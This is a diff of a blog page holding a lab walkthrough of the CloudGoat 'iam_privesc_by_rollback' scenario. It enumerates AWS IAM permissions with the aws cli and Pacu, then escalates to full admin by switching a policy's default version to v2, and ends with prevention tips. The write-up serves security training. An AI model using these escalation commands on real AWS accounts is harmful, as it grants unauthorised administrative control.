@@ -1,377 +1,224 @@
-<!doctype html><html lang=en>
-<head>
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-133811886-2')</script>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta http-equiv=x-ua-compatible content="IE=edge">
-<script src=/js/nav.js></script>
-<link rel="shortcut icon" href=/favicon.ico>
-<link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous>
-<link rel=stylesheet href=/css/main.css>
-<title>
-iam_privesc_by_rollback | jellyparks
-</title>
-</head>
-<body>
-<header>
-</header>
-<div class=site-wrapper>
-<div class="sticky top-bar">
-<div id=mySidenav class=sidenav include-nav=/nav.html>
-</div>
-<span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span>
-</div>
-<div class=container>
-<div class=blog-header>
-<h1>iam_privesc_by_rollback</h1>
-</div>
-<div class=row>
-<div class="col-sm-8 blog-main">
-<div class=blog-post>
-<hr>
-<p>According to the official documentation for this scenario (<a href=https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/iam_privesc_by_rollback>here</a>) the overall goal is to &ldquo;Acquire full admin privileges.&rdquo;</p>
-<p>We can create the challenge by running</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 cloudgoat.py create iam_privesc_by_rollback
-</code></pre></td></tr></table>
-</div>
-</div><p>The build process will begin and when it finishes we will be provided with a set of credentials for the Raynor user account.</p>
-<hr>
-<h3 id=raynor>Raynor</h3>
-<p>In the real world, we probably wouldn&rsquo;t just be handed these credentials. However, people make mistakes and credentials are often accidentally exposed. Let&rsquo;s start doing basic enumeration and see if we can determine what things we have access to. To do this we&rsquo;ll run the following set of commands just to poke at a few of the more common services:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile solus s3 ls
-aws --profile solus ec2 describe-instances
-aws --profile solus iam list-roles
-aws --profile solus lambda list-functions
-</code></pre></td></tr></table>
-</div>
-</div><p>All of the api calls fail with the exeption being iam list-roles. We can clean the output up by using jq:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile raynor iam list-roles | jq <span style=color:#0c6>&#39;.Roles[].RoleName&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>This command will produce an output similar to the one below.</p>
-<p><img src=images/jq-list-roles.png alt=jq-list-roles.png class=img-fluid></p>
-<p>The key takeaway here is that we have access to a user account with some level of IAM permissions. How much access do we have? One way to find out is by leveraging Pacu to bruteforce those permissions for us. The other option is to make iam calls one at a time to determine where our limits may exist. For this example we&rsquo;ll leverage Pacu and run the iam__enum_users_roles_policies_groups module.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>run iam__enum_users_roles_policies_groups
-</code></pre></td></tr></table>
-</div>
-</div><p>Once the module finishes its execution we see that it successfully enumeated various aspects of the account.</p>
-<p><img src=images/iam-enum-results.png alt=iam-enum-results.png class=img-fluid></p>
-<p>We can run the data <code>IAM command</code> to see information associated with the enumeration. At first glance of the policies it appears there is a specific policy listed for our user account: <code>cg-raynor-policy</code></p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=color:#0c6>&#34;Policies&#34;</span><span style=color:#fff;background-color:#c00>:</span> [
- {
-  <span style=color:#2c5dcd;font-weight:700>&#34;PolicyName&#34;</span>: <span style=color:#0c6>&#34;cg-raynor-policy&#34;</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;PolicyId&#34;</span>: <span style=color:#0c6>&#34;ANPA5X73I5MBNC3PRT6CO&#34;</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;Arn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:iam::121212121212:policy/cg-raynor-policy&#34;</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;Path&#34;</span>: <span style=color:#0c6>&#34;/&#34;</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;DefaultVersionId&#34;</span>: <span style=color:#0c6>&#34;v1&#34;</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;AttachmentCount&#34;</span>: <span style=color:#5918bb;font-weight:700>1</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;IsAttachable&#34;</span>: <span style=color:#2c5dcd;font-weight:700>true</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;Mon, 25 May 2020 14:24:46&#34;</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;UpdateDate&#34;</span>: <span style=color:#0c6>&#34;Mon, 25 May 2020 14:24:48&#34;</span>
- }
-]<span style=color:#fff;background-color:#c00>,</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Looking at the details above we can also tell that the policy is curently attached <code>AttachmentCount: 1</code> and the version being used is v1 <code>DefaultVersionId: v1</code>. If we wanted to leverage the aws cli in place of Pacu we could run the command below. The command is filtering to show only those policies which are currently attached to a resource.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile raynor iam list-policies --only-attached --scope Local
-
-<span style=color:#2c5dcd>{</span>
- <span style=color:#0c6>&#34;Policies&#34;</span>: <span style=color:#2c5dcd>[</span>
-  <span style=color:#2c5dcd>{</span>
-   <span style=color:#0c6>&#34;PolicyName&#34;</span>: <span style=color:#0c6>&#34;cg-raynor-policy&#34;</span>,
-   <span style=color:#0c6>&#34;PolicyId&#34;</span>: <span style=color:#0c6>&#34;ANPA5X73I5MBNC3PRT6CO&#34;</span>,
-   <span style=color:#0c6>&#34;Arn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:iam::121212121212:policy/cg-raynor-policy&#34;</span>,
-   <span style=color:#0c6>&#34;Path&#34;</span>: <span style=color:#0c6>&#34;/&#34;</span>,
-   <span style=color:#0c6>&#34;DefaultVersionId&#34;</span>: <span style=color:#0c6>&#34;v1&#34;</span>,
-   <span style=color:#0c6>&#34;AttachmentCount&#34;</span>: 1,
-   <span style=color:#0c6>&#34;PermissionsBoundaryUsageCount&#34;</span>: 0,
-   <span style=color:#0c6>&#34;IsAttachable&#34;</span>: true,
-   <span style=color:#0c6>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:46Z&#34;</span>,
-   <span style=color:#0c6>&#34;UpdateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:48Z&#34;</span>
-  <span style=color:#2c5dcd>}</span>
- <span style=color:#2c5dcd>]</span>
-<span style=color:#2c5dcd>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>The next question we have to answer is the policy attached to our user account? We can do that by quering the list-attached-user-policies endpoint and our user name raynor. An example command and output is below.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile raynor iam list-attached-user-policies --user-name raynor
-
-<span style=color:#2c5dcd>{</span>
- <span style=color:#0c6>&#34;AttachedPolicies&#34;</span>: <span style=color:#2c5dcd>[</span>
-  <span style=color:#2c5dcd>{</span>
-   <span style=color:#0c6>&#34;PolicyName&#34;</span>: <span style=color:#0c6>&#34;cg-raynor-policy&#34;</span>,
-   <span style=color:#0c6>&#34;PolicyArn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:iam::121212121212:policy/cg-raynor-policy&#34;</span>
-  <span style=color:#2c5dcd>}</span>
- <span style=color:#2c5dcd>]</span>
-<span style=color:#2c5dcd>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><hr>
-<h3 id=versions>Versions</h3>
-<p>Good news, it appears the raynor policy is currently associated with the raynor user account. Lets see if we can learn more about what we are allowed to do and what we are not allowed to do. We can accomplish this by making a call to the <code>get-policy-version</code> endpoint as seen below.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v1
-<span style=color:#2c5dcd>{</span>
- <span style=color:#0c6>&#34;PolicyVersion&#34;</span>: <span style=color:#2c5dcd>{</span>
-  <span style=color:#0c6>&#34;Document&#34;</span>: <span style=color:#2c5dcd>{</span>
-   <span style=color:#0c6>&#34;Version&#34;</span>: <span style=color:#0c6>&#34;2012-10-17&#34;</span>,
-   <span style=color:#0c6>&#34;Statement&#34;</span>: <span style=color:#2c5dcd>[</span>
-    <span style=color:#2c5dcd>{</span>
-     <span style=color:#0c6>&#34;Sid&#34;</span>: <span style=color:#0c6>&#34;IAMPrivilegeEscalationByRollback&#34;</span>,
-     <span style=color:#0c6>&#34;Action&#34;</span>: <span style=color:#2c5dcd>[</span>
-      <span style=color:#0c6>&#34;iam:Get*&#34;</span>,
-      <span style=color:#0c6>&#34;iam:List*&#34;</span>,
-      <span style=color:#0c6>&#34;iam:SetDefaultPolicyVersion&#34;</span>
-     <span style=color:#2c5dcd>]</span>,
-     <span style=color:#0c6>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
-     <span style=color:#0c6>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
-    <span style=color:#2c5dcd>}</span>
-   <span style=color:#2c5dcd>]</span>
-  <span style=color:#2c5dcd>}</span>,
-  <span style=color:#0c6>&#34;VersionId&#34;</span>: <span style=color:#0c6>&#34;v1&#34;</span>,
-  <span style=color:#0c6>&#34;IsDefaultVersion&#34;</span>: true,
-  <span style=color:#0c6>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:46Z&#34;</span>
- <span style=color:#2c5dcd>}</span>
-<span style=color:#2c5dcd>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>For the call to work we specified the policy arn as well as the version currently applied. From the output it looks like we can make calls to iam resources if they are a Get, List, or SetDefaultPolicyVersion. That last one is interesting. Perhaps our currently policy has more than one version? Let&rsquo;s check to see if version 2 of our policy exists. The results are below:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v2
-
-<span style=color:#2c5dcd>{</span>
- <span style=color:#0c6>&#34;PolicyVersion&#34;</span>: <span style=color:#2c5dcd>{</span>
-  <span style=color:#0c6>&#34;Document&#34;</span>: <span style=color:#2c5dcd>{</span>
-   <span style=color:#0c6>&#34;Version&#34;</span>: <span style=color:#0c6>&#34;2012-10-17&#34;</span>,
-   <span style=color:#0c6>&#34;Statement&#34;</span>: <span style=color:#2c5dcd>[</span>
-    <span style=color:#2c5dcd>{</span>
-     <span style=color:#0c6>&#34;Action&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>,
-     <span style=color:#0c6>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
-     <span style=color:#0c6>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
-    <span style=color:#2c5dcd>}</span>
-   <span style=color:#2c5dcd>]</span>
-  <span style=color:#2c5dcd>}</span>,
-  <span style=color:#0c6>&#34;VersionId&#34;</span>: <span style=color:#0c6>&#34;v2&#34;</span>,
-  <span style=color:#0c6>&#34;IsDefaultVersion&#34;</span>: false,
-  <span style=color:#0c6>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:48Z&#34;</span>
- <span style=color:#2c5dcd>}</span>
-<span style=color:#2c5dcd>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Interesting, a version 2 of the policy does exist, and it gives full admin access to the entire account. Our current policy provides us with the ability to set the default version of a policy. If we were to change the default version of the policy currently applied to our user account from 1 to 2 we could escalate our privledges to full admin.</p>
-<p>The command below will accomplish this.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile raynor iam set-default-policy-version --policy arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v2
-</code></pre></td></tr></table>
-</div>
-</div><p>If successful there will be no response. We can validate the command was successful by re-running the <code>list-policies</code> command:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile raynor iam list-policies --only-attached --scope Local
-
-<span style=color:#2c5dcd>{</span>
- <span style=color:#0c6>&#34;Policies&#34;</span>: <span style=color:#2c5dcd>[</span>
-  <span style=color:#2c5dcd>{</span>
-   <span style=color:#0c6>&#34;PolicyName&#34;</span>: <span style=color:#0c6>&#34;cg-raynor-policy&#34;</span>,
-   <span style=color:#0c6>&#34;PolicyId&#34;</span>: <span style=color:#0c6>&#34;ANPA5X73I5MBNC3PRT6CO&#34;</span>,
-   <span style=color:#0c6>&#34;Arn&#34;</span>: <span style=color:#0c6>&#34;arn:aws:iam::121212121212:policy/cg-raynor-policy&#34;</span>,
-   <span style=color:#0c6>&#34;Path&#34;</span>: <span style=color:#0c6>&#34;/&#34;</span>,
-   <span style=color:#0c6>&#34;DefaultVersionId&#34;</span>: <span style=color:#0c6>&#34;v2&#34;</span>,
-   <span style=color:#0c6>&#34;AttachmentCount&#34;</span>: 1,
-   <span style=color:#0c6>&#34;PermissionsBoundaryUsageCount&#34;</span>: 0,
-   <span style=color:#0c6>&#34;IsAttachable&#34;</span>: true,
-   <span style=color:#0c6>&#34;CreateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T14:24:46Z&#34;</span>,
-   <span style=color:#0c6>&#34;UpdateDate&#34;</span>: <span style=color:#0c6>&#34;2020-05-25T18:28:50Z&#34;</span>
-  <span style=color:#2c5dcd>}</span>
- <span style=color:#2c5dcd>]</span>
-<span style=color:#2c5dcd>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Notice the default version has changed from <code>v1</code> to <code>v2</code>. At this point we have full administrative rights to this aws account.</p>
-<hr>
-<h3 id=prevention>Prevention</h3>
-<p>So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.</p>
-<ol>
-<li>The most important is to not expose credentials. If we were not able to leverage raynors credentials we would not have been able to authenticate and further escalate privileges.</li>
-<li>Limit what users can do. The policy associated with raynor allowed for too much access. I imagine in the real world a user with this set of actions at there disposal would likely have much more persmissions within the account.</li>
-</ol>
-</div>
-</div>
-<div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0>
-<nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav>
-<h5>contents</h5>
-<ul class="nav post-sidenav">
-<li><nav id=TableOfContents>
-<ul>
-<li>
-<ul>
-<li><a href=#raynor>Raynor</a></li>
-<li><a href=#versions>Versions</a></li>
-<li><a href=#prevention>Prevention</a></li>
-</ul>
-</li>
-</ul>
-</nav></li>
-</ul>
-</nav>
-</div>
-</div>
-</div>
-</div>
-<footer>
-</footer>
-</body>
-<script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-133811886-2")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><script src=/js/nav.js></script>
